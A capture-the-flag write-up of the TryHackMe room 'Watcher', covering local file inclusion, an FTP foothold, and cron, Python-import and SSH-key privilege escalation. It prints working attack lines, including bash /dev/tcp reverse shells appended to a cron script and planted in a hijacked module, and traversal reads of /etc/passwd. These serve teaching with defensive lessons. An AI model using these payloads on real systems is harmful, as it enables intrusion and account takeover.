# TryHackMe: Watcher — Writeup

**Room:** [Watcher](https://tryhackme.com/room/watcher)
**Difficulty:** Medium
**Category:** Web Exploitation, Linux Privilege Escalation

## Overview

Watcher is a web box built around a single **Local File Inclusion (LFI)** flaw in
a `?post=` parameter. The LFI reads a protected file that leaks **FTP
credentials**; the FTP account can write to a web-served directory, so uploading
a PHP reverse shell and triggering it through the same LFI gives code execution.
From there the box is a chain of **four privilege escalations** — each user can
reach the next through a writable cron script, a writable Python module imported
by a `sudo`-allowed script, and finally a root SSH key left in a backups folder —
ending in **full root compromise**.

## Skills Demonstrated

- Content discovery with `ffuf` + `robots.txt` enumeration
- Local File Inclusion (LFI) for protected-file disclosure
- Path traversal (`../` sequences) to read arbitrary files (`/etc/passwd`)
- Credential disclosure → FTP foothold
- LFI → RCE by uploading a PHP shell to a writable path and including it
- Linux privilege escalation via a world-writable cron script
- Python module hijacking of a `sudo`-allowed script (import-path abuse)
- Sensitive data exposure (root SSH private key in `/opt/backups`)

---

## 1. Recon & Enumeration

Standard `nmap` service/version scan:

```bash
nmap -sC -sV TARGET_IP
```

HTTP (80) and FTP (21) were the services of interest. `ffuf` directory fuzzing
surfaced nothing high-value:

```bash
ffuf -u http://TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

`robots.txt` was more useful — it listed two files:

```
/flag_1.txt
/secret_file_do_not_read.txt
```

`flag_1.txt` opened directly in the browser (**first flag**).
`secret_file_do_not_read.txt` returned **403 Permission Denied** — the web
server blocks a direct request. A file the server refuses to serve directly is
exactly the kind of file an LFI can reach from the *inside*.

## 2. Local File Inclusion in `?post=`

Browsing the blog, opening a post loaded a URL of the form:

```
http://TARGET_IP/post.php?post=file.php
```

The parameter is a **filename passed straight into an include** — a classic LFI
sink. Pointing it at the protected secret file read it server-side, bypassing the
403:

```
http://TARGET_IP/post.php?post=secret_file_do_not_read.txt
```

The file contained **FTP credentials**.

**Lesson:** Never pass a user-controlled value into a file-include call. A
`robots.txt`/web-server rule that "hides" a file only blocks the direct HTTP
path — it does nothing against an include that reads the file from disk.

## 3. FTP Foothold

Logged into FTP with the leaked credentials:

```bash
ftp TARGET_IP
# user/pass from secret_file_do_not_read.txt
```

The FTP home held the **second flag**, and a `files/` directory that was empty
but — importantly — **writable**. Writable storage that may also be served by the
web app is a direct path to RCE.

## 4. Confirming Path Traversal

Before weaponising, I confirmed the include honoured `../` traversal by reading a
file well outside the web root:

```
http://TARGET_IP/post.php?post=../../../../../../etc/passwd
```

`/etc/passwd` rendered — traversal works, so I can include a file from **any**
path on disk, including the FTP-writable `files/` directory.

## 5. LFI → RCE (PHP reverse shell via FTP)

Uploaded a PHP reverse shell into the FTP `files/` directory:

```bash
# in the ftp session
put reverse.php
```

Including it through the web root path (`/var/www/html/files/reverse.php`) did
**not** execute — that location wasn't where the FTP upload actually landed. The
FTP user's `files/` sits under its **home directory**, so I reached it through
the traversal include instead:

```
http://TARGET_IP/post.php?post=../../../../home/ftpuser/ftp/files/reverse.php
```

With a listener running, the shell fired, giving a shell as **www-data**:

```bash
nc -lvnp 4444
```

A flag and a note (mentioning **cron jobs**) were waiting in the web user's
context.

**Lesson:** LFI becomes RCE the moment the attacker controls the *content* of any
file on disk. A writable FTP directory + a traversal-capable include is a
complete remote-code-execution chain.

## 6. PrivEsc: www-data → mat (writable cron script)

The note hinted at cron. Reading the crontab:

```bash
cat /etc/crontab
# * * * * * mat /home/toby/jobs/cow.sh
```

A job runs `cow.sh` **as the user `mat`**, and the script lived in a directory
`www-data` could write to. Appending a reverse-shell line meant the next cron
tick would execute it as `mat`:

```bash
echo 'bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"' >> /home/toby/jobs/cow.sh
```

With a listener up, the cron fired and returned a shell as **mat** — holding
another flag and a note.

**Lesson:** A cron script that runs as a privileged user must not be writable by
a lower-privileged one. Write access to the *script* equals command execution as
the *scheduler's* user.

## 7. PrivEsc: mat → will (Python module hijack of a sudo script)

mat's note pointed at being able to run a Python script as **will**. Two scripts
were present — `will_script.py` and `cmd.py` — and `will_script.py` **imports
`cmd`**. Checking the sudo grant:

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 2
```

Because Python imports a module from the **script's own directory first**, and
`cmd.py` was writable by mat, I replaced `cmd.py` with code that spawns a shell —
it runs the moment `will_script.py` imports it, under will's identity:

```python
cat > cmd.py << 'EOF'
import os

def get_command(num):
    os.system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/4446 0>&1'")
    return "id"
EOF
```

With a listener on 4446, running the sudo command imported the hijacked module
and returned a shell as **will** (which held its flag):

```bash
nc -lvnp 4446
# then, as mat:
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 2
```

**Lesson:** A `sudo`-allowed script is only as safe as everything it imports.
Local modules load from the script's directory first — if any imported `.py` is
writable by the caller, the whole `sudo` grant is a free escalation. Scripts run
under `sudo` should use absolute, locked-down import paths.

## 8. PrivEsc: will → root (SSH key in /opt/backups)

As will, `sudo -l` demanded a password (dead end) and `find / -perm -4000 -type f`
turned up no useful SUID binary:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Enumerating `/opt` revealed a `backups/` directory containing a base64-encoded
key:

```bash
ls -la /opt/backups
# key.b64
```

I pulled it to my machine, decoded it, and it was a **private SSH key** — for
root. Fixing permissions and using it to log in:

```bash
# on attacker machine
base64 -d key.b64 > root_key
chmod 400 root_key
ssh -i root_key root@TARGET_IP
```

This dropped straight into a **root** shell — the final flag was in `/root`.

**Lesson:** Private keys are credentials. A root SSH key sitting in a
world-readable backups folder is game over regardless of how hardened the rest of
the box is. Backups of secrets need the same access controls as the secrets.

---

## Summary of the Attack Chain

| # | Vulnerability | Impact |
|---|---|---|
| 1 | `robots.txt` exposes protected filenames | Information disclosure (flag 1) |
| 2 | LFI in `post.php?post=` | Reads 403-protected file → FTP creds |
| 3 | Path traversal in the include | Arbitrary file read (`/etc/passwd`) |
| 4 | Writable FTP dir served to the include | LFI → RCE, shell as `www-data` |
| 5 | World-writable cron script (`cow.sh`) | `www-data` → `mat` |
| 6 | Writable imported module in a sudo script | `mat` → `will` |
| 7 | Root SSH private key in `/opt/backups` | `will` → **root** |

## Flags

- Flag 1 (`/flag_1.txt`): `THM{redacted}`
- Flag 2 (FTP home): `THM{redacted}`
- www-data flag: `THM{redacted}`
- mat flag: `THM{redacted}`
- will flag: `THM{redacted}`
- Root flag (`/root`): `THM{redacted}`

_Flags and credentials redacted per CTF writeup etiquette. Complete the room
yourself to retrieve them._
